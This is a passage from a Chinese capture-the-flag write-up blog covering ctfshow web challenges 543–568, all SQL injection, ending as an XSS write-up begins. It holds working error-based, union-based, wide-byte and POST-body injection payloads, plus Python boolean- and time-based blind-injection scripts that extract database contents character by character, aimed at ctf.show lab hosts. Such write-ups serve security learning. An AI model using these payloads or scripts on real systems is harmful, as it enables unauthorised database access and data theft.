<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">对于空格，有较多的方法：</span><br><span class="line"></span><br><span class="line">%09 TAB 键（水平）</span><br><span class="line"></span><br><span class="line">%0a 新建一行</span><br><span class="line"></span><br><span class="line">%0c 新的一页</span><br><span class="line"></span><br><span class="line">%0d return 功能</span><br><span class="line"></span><br><span class="line">%0b TAB 键（垂直）</span><br><span class="line"></span><br><span class="line">%a0 空格</span><br></pre></td></tr></table></figure></div>

<p><strong>报错注入</strong></p>
<p>查表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://85e19e80-5430-40a0-8004-b63040436341.challenge.ctf.show:<span class="number">8080</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'||updatexml(1,concat(0x3d,(select(group_concat(table_name))from(infoorrmation_schema.tables)where`table_schema`='</span>ctfshow<span class="string">')),1)||'</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>查字段</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://85e19e80-5430-40a0-8004-b63040436341.challenge.ctf.show:<span class="number">8080</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'||updatexml(1,concat(0x3d,(select(group_concat(column_name))from(infoorrmation_schema.columns)where`table_schema`='</span>ctfshow<span class="string">'||`table_name`='</span>flags<span class="string">')),1)||'</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>接着查flag</p>
<h2 id="web544"><a href="#web544" class="headerlink" title="web544"></a>web544</h2><blockquote>
<p>布尔盲注</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://537b3c06-bc22-41e1-a4c3-a65f72d1a4f9.challenge.ctf.show:8080/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line"><span class="comment">#sql="database()"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select(group_concat(table_name))from(infoorrmation_schema.tables)where`table_schema`='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select(group_concat(column_name))from(infoorrmation_schema.columns)where`table_schema`='ctfshow'||`table_name`='flags'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select`flag4s`from(ctfshow.flags)"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">"?id=100')||if(ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;'&#123;&#125;',1,0)||('1'='0"</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        url_get = url + payload.format(sql,i,mid)</span><br><span class="line">        res = requests.get(url=url_get)</span><br><span class="line">        print(res.url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Dumb'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">        flag += chr(tail)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[*] Complete! Result Is &gt;&gt;&gt; &#123;&#125;'</span>.format(flag))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210811093024535.png" alt="image-20210811093024535"></p>
<h2 id="web545"><a href="#web545" class="headerlink" title="web545"></a>web545</h2><blockquote>
<p>过滤了select的大小写，但是没过滤混写，直接就报错注入</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://6330b356-94f7-4772-a30b-5c077776fed2.challenge.ctf.show:<span class="number">8080</span>/?<span class="keyword">id</span>=<span class="number">0</span><span class="string">'%09or%09updatexml(1,concat(0x3d,(SelecT%09right(group_concat(flag4s),20)%09from%09ctfshow.`flags`)),1)%09or%09'</span><span class="number">1</span><span class="string">'='</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web546"><a href="#web546" class="headerlink" title="web546"></a>web546</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://efdac04a-9f0d-4023-8689-95c04fac6cdf.challenge.ctf.show:8080/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line"><span class="comment">#sql="database()"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "SelecT(group_concat(table_name))from(information_schema.tables)where`table_schema`='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "SelecT(group_concat(column_name))from(information_schema.columns)where`table_schema`='ctfshow'||`table_name`='flags'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"SelecT`flag4s`from(ctfshow.flags)"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">'?id=100"%09or%09if(ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;"&#123;&#125;",1,0)%09or%09"1"="0'</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        url_get = url + payload.format(sql,i,mid)</span><br><span class="line">        res = requests.get(url=url_get)</span><br><span class="line">        print(res.url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Dumb'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">        flag += chr(tail)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[*] Complete! Result Is &gt;&gt;&gt; &#123;&#125;'</span>.format(flag))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web547"><a href="#web547" class="headerlink" title="web547"></a>web547</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ee1e575c-882c-4a99-ab79-d10bb4557986.challenge.ctf.show:8080/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line"><span class="comment">#sql="database()"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "SelecT(group_concat(table_name))from(information_schema.tables)where`table_schema`='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "SelecT(group_concat(column_name))from(information_schema.columns)where`table_schema`='ctfshow'||`table_name`='flags'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"SelecT`flag4s`from(ctfshow.flags)"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">"?id=1.1')%09or%09if(ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;'&#123;&#125;',1,0)%09or%09('1'='0"</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        url_get = url + payload.format(sql,i,mid)</span><br><span class="line">        res = requests.get(url=url_get)</span><br><span class="line">        print(res.url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Dumb'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">        flag += chr(tail)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[*] Complete! Result Is &gt;&gt;&gt; &#123;&#125;'</span>.format(flag))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web548"><a href="#web548" class="headerlink" title="web548"></a>web548</h2><blockquote>
<p>用上题的payload</p>
</blockquote>
<h2 id="web549"><a href="#web549" class="headerlink" title="web549"></a>web549</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://fd8bb41c-9623-41d7-9b87-012ec43f801d.challenge.ctf.show:<span class="number">8080</span>/?<span class="keyword">id</span>=<span class="number">1</span>&amp;<span class="keyword">id</span>=<span class="number">1.1</span><span class="string">' union select 1,2,(select group_concat(flag4s) from ctfshow.flags) %23</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web550"><a href="#web550" class="headerlink" title="web550"></a>web550</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://dcc7eabd-ecb6-4f83-a660-ce28ab3ba400.challenge.ctf.show:<span class="number">8080</span>/?<span class="keyword">id</span>=<span class="number">1</span>&amp;<span class="keyword">id</span>=<span class="number">1.1</span><span class="string">" union select 1,2,(select group_concat(flag4s) from ctfshow.flags) #</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web551"><a href="#web551" class="headerlink" title="web551"></a>web551</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://f69c9b47-4023-4f2f-8bf5-f9e3ab878748.challenge.ctf.show:<span class="number">8080</span>/?<span class="keyword">id</span>=<span class="number">1</span>&amp;<span class="keyword">id</span>=<span class="number">1.1</span><span class="string">") union select 1,2,(select group_concat(flag4s) from ctfshow.flags)%23</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web552"><a href="#web552" class="headerlink" title="web552"></a>web552</h2><blockquote>
<p><strong>宽字节注入，找个%df开头的或者直接用%df，我用’汉’因为汉的url编码是大于%df可以和转义字符组合来绕过</strong></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://53c6d802-4048-4c38-ab11-b5d83535dc83.challenge.ctf.show:<span class="number">8080</span>/?<span class="keyword">id</span>=<span class="number">1.1</span>汉<span class="string">' union select 1,2,(select group_concat(flag4s) from ctfshow.flags)%23</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web553"><a href="#web553" class="headerlink" title="web553"></a>web553</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ba8afb54-5cde-40e3-ab92-be77a22ec24f.challenge.ctf.show:8080&#x2F;?id&#x3D;1.1汉&#39; union select 1,2,(select group_concat(flag4s) from ctfshow.flags)%23</span><br></pre></td></tr></table></figure></div>

<h2 id="web554"><a href="#web554" class="headerlink" title="web554"></a>web554</h2><blockquote>
<p>改post传参</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">passwd&#x3D;&#39;&amp;uname&#x3D;汉&#39; union select 1,(select group_concat(flag4s) from ctfshow.flags) #</span><br></pre></td></tr></table></figure></div>

<h2 id="web555"><a href="#web555" class="headerlink" title="web555"></a>web555</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;09ecb96f-d4be-426f-921c-ea2e2843e1ef.challenge.ctf.show:8080&#x2F;?id&#x3D;1.1 union select 1,2,(select group_concat(flag4s) from ctfshow.flags)</span><br></pre></td></tr></table></figure></div>

<h2 id="web556"><a href="#web556" class="headerlink" title="web556"></a>web556</h2><blockquote>
<p>post</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">passwd&#x3D;1&amp;uname&#x3D;1汉&#39; union select 1,(select group_concat(flag4s) from ctfshow.flags )#</span><br></pre></td></tr></table></figure></div>

<h2 id="web556-1"><a href="#web556-1" class="headerlink" title="web556"></a>web556</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://22c4b934-153e-44df-9445-c6226ac0ac9c.challenge.ctf.show:<span class="number">8080</span>/?<span class="keyword">id</span>=<span class="number">1111</span><span class="string">' union select 1,2,(select group_concat(flag4s) from ctfshow.flags) %23</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web557"><a href="#web557" class="headerlink" title="web557"></a>web557</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;22c4b934-153e-44df-9445-c6226ac0ac9c.challenge.ctf.show:8080&#x2F;?id&#x3D;1111&#39; union select 1,2,(select group_concat(flag4s) from ctfshow.flags) %23</span><br></pre></td></tr></table></figure></div>

<h2 id="web558"><a href="#web558" class="headerlink" title="web558"></a>web558</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;22c4b934-153e-44df-9445-c6226ac0ac9c.challenge.ctf.show:8080&#x2F;?id&#x3D;1111&#39; union select 1,2,(select group_concat(flag4s) from ctfshow.flags) %23</span><br></pre></td></tr></table></figure></div>

<h2 id="web559"><a href="#web559" class="headerlink" title="web559"></a>web559</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://75bb73cb-5451-44d8-8cb3-d6f44fbda222.challenge.ctf.show:<span class="number">8080</span>/?<span class="keyword">id</span>=<span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(flag4s) <span class="keyword">from</span> ctfshow.flags)</span><br></pre></td></tr></table></figure></div>

<h2 id="web560"><a href="#web560" class="headerlink" title="web560"></a>web560</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;c895e905-3a52-4e50-b89d-2b9ddcc32932.challenge.ctf.show:8080&#x2F;?id&#x3D;1.1&#39;)union select 1,2,(select group_concat(flag4s) from ctfshow.flags)%23</span><br></pre></td></tr></table></figure></div>

<h2 id="web561"><a href="#web561" class="headerlink" title="web561"></a>web561</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;c235305-3a52-4e50-b89d-2b9ddcc32932.challenge.ctf.show:8080&#x2F;?id&#x3D;1.1 union select 1,2,(select group_concat(flag4s) from ctfshow.flags)%23</span><br></pre></td></tr></table></figure></div>

<h2 id="web562"><a href="#web562" class="headerlink" title="web562"></a>web562</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">login_user&#x3D;123&amp;login_password&#x3D;123&#39; or updatexml(1,concat(0x3d,(select right(group_concat(flag4s),20) from ctfshow.flags)),1) #&amp;mysubmit&#x3D;Login</span><br></pre></td></tr></table></figure></div>

<h2 id="web563"><a href="#web563" class="headerlink" title="web563"></a>web563</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">login_user&#x3D;1&amp;login_password&#x3D;&#39;)or updatexml(1,concat(0x3d,(select right(group_concat(flag4s),20) from ctfshow.flags)),1)#&amp;mysubmit&#x3D;Login</span><br></pre></td></tr></table></figure></div>

<h2 id="web564"><a href="#web564" class="headerlink" title="web564"></a>web564</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;3ba671d4-5c42-4e8a-a797-07e6ee44a52b.challenge.ctf.show:8080&#x2F;?sort&#x3D;updatexml(1,concat(0x3d,(select right(group_concat(flag4s),30) from ctfshow.flags)),1)</span><br></pre></td></tr></table></figure></div>

<h2 id="web565"><a href="#web565" class="headerlink" title="web565"></a>web565</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e39b572e-e357-4c36-a5c6-938f53ae7946.challenge.ctf.show:8080&#x2F;?sort&#x3D;1&#39; or updatexml(1,concat(0x3d,(select right(group_concat(flag4s),30) from ctfshow.flags)),1)%23</span><br></pre></td></tr></table></figure></div>

<h2 id="web566"><a href="#web566" class="headerlink" title="web566"></a>web566</h2><blockquote>
<p><strong>可以写个时间盲注</strong></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://c2fd5b24-8246-4a1f-a529-b67bacd1f312.challenge.ctf.show:8080/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line"><span class="comment">#sql="database()"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "SelecT(group_concat(table_name))from(information_schema.tables)where`table_schema`='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "SelecT(group_concat(column_name))from(information_schema.columns)where`table_schema`='ctfshow'||`table_name`='flags'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"SelecT`flag4s`from(ctfshow.flags)"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">"?sort=if(ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;'&#123;&#125;',sleep(0.05),0)"</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        url_get = url + payload.format(sql,i,mid)</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.get(url=url_get)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(end-start)</span><br><span class="line">        <span class="keyword">if</span> end-start &gt; <span class="number">0.5</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">        flag += chr(tail)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[*] Complete! Result Is &gt;&gt;&gt; &#123;&#125;'</span>.format(flag))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web567"><a href="#web567" class="headerlink" title="web567"></a>web567</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://85177ce8-3c71-4581-984f-06a432d68995.challenge.ctf.show:8080/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line"><span class="comment">#sql="database()"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "SelecT(group_concat(table_name))from(information_schema.tables)where`table_schema`='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "SelecT(group_concat(column_name))from(information_schema.columns)where`table_schema`='ctfshow'||`table_name`='flags'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"SelecT`flag4s`from(ctfshow.flags)"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">"?sort=if(ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;'&#123;&#125;',sleep(0.05),0)"</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        url_get = url + payload.format(sql,i,mid)</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.get(url=url_get)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(end-start)</span><br><span class="line">        <span class="keyword">if</span> end-start &gt; <span class="number">0.7</span>  :</span><br><span class="line">            head = mid + <span class="number">1</span> <span class="comment">#ctfshow&#123;6e5fc803-1b1e-4P1a-b7d5-8c6b2620e08a&#125;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">        flag += chr(tail)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[*] Complete! Result Is &gt;&gt;&gt; &#123;&#125;'</span>.format(flag))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web568"><a href="#web568" class="headerlink" title="web568"></a>web568</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://3014ef4e-da57-4cda-8e9d-69e8b8789ae9.challenge.ctf.show:<span class="number">8080</span>/?<span class="keyword">sort</span>=<span class="number">1</span><span class="string">' or updatexml(1,concat(0x3d,(select right(group_concat(flag4s),20) from ctfshow.flags)),1)%23</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web篇-XSS wp</title>
    <url>/posts/71.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>记录web的题目wp，慢慢变强，铸剑。</p>
</blockquote>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><blockquote>
<p><strong>什么是xss？</strong></p>
